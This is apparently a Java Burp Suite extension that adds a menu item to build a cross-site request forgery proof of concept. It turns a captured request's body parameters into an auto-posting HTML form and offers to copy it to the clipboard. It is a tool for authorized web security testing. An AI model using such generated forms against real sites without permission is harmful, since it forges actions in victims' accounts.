import burp.*;
import java.net.URL;
import java.util.*;
import java.util.regex.*;
import java.io.*;
import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.datatransfer.*;
/**
Burp Extender allows third-party developers to extend the functionality of Burp Suite.
Extensions can read and modify Burp's runtime data and configuration, initiate key actions, and extend Burp's user interface.
**/
public class BurpExtender
{	
	
	 public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        callbacks.registerMenuItem("create csrf PoC", new CreateCSRFPoC(callbacks));
    }
}

class CreateCSRFPoC implements IMenuItemHandler,ActionListener
{
	
	public IBurpExtenderCallbacks mCallbacks;
	public StringSelection CSRFCodeToCopy;
	public CreateCSRFPoC(IBurpExtenderCallbacks callbacks) 
	{
		mCallbacks = callbacks;
	}
	
    public void menuItemClicked(String menuItemCaption, IHttpRequestResponse[] messageInfo)
    {
        try
        {
			String CSRFTarget = new String();
			
            for (int i = 0; i < messageInfo.length; i++)
            {
			
			String target = messageInfo[i].getUrl().toString();
			CSRFTarget = "<html>\n";
			CSRFTarget += "<body>\n";
			CSRFTarget += "<form action = \"" + target + "\" method = \"POST\">\n";
			
				byte[] request = messageInfo[i].getRequest();
								
				String[][] params = mCallbacks.getParameters(request);
								
				for(int j=0; j<params.length; j++)
				{
				
					if(params[j][2].equals("body parameter"))
					{
					/*
					for(int k=0; k<params[j].length; k++)
					{
						System.out.println(params[j][k]+", ");
					}
					System.out.println("\n");
					*/
					
					CSRFTarget += "<input type=\"hidden\" name=\""+params[j][0]+"\" value=\""+params[j][1]+"\">\n";
					
					}
				}
			CSRFTarget += "<input type=\"Submit\" value=\"Click Me!\" />";
			CSRFTarget += "</body>\n";
			CSRFTarget += "</html>\n";				
				
            }
			
			CSRFCodeToCopy = new StringSelection(CSRFTarget);
			
			JFrame frame= new JFrame("CSRF PoC");
			JPanel panel=new JPanel(new BorderLayout());
			
			JTextArea jt= new JTextArea(CSRFTarget,5,20);
			JScrollPane scrollPane = new JScrollPane(jt);
			jt.setEditable(false);	
			
			frame.add(panel);
			panel.add(scrollPane, BorderLayout.CENTER);
			
			Button button = new Button("Copy to clipboard"); 
			panel.add(button, BorderLayout.SOUTH); 
			button.addActionListener(this);
			
			
			frame.setSize(250,200);
			frame.setVisible(true);
			frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

	public void actionPerformed(ActionEvent e) {
                System.out.println("click!");
				Toolkit toolkit = Toolkit.getDefaultToolkit();
				Clipboard clipboard = toolkit.getSystemClipboard();
				clipboard.setContents(CSRFCodeToCopy, CSRFCodeToCopy);
        }

        public void windowClosing(WindowEvent e) {}
        public void windowOpened(WindowEvent e) {}
        public void windowActivated(WindowEvent e) {}
        public void windowIconified(WindowEvent e) {}
        public void windowDeiconified(WindowEvent e) {}
        public void windowDeactivated(WindowEvent e) {}
        public void windowClosed(WindowEvent e) {}
	
}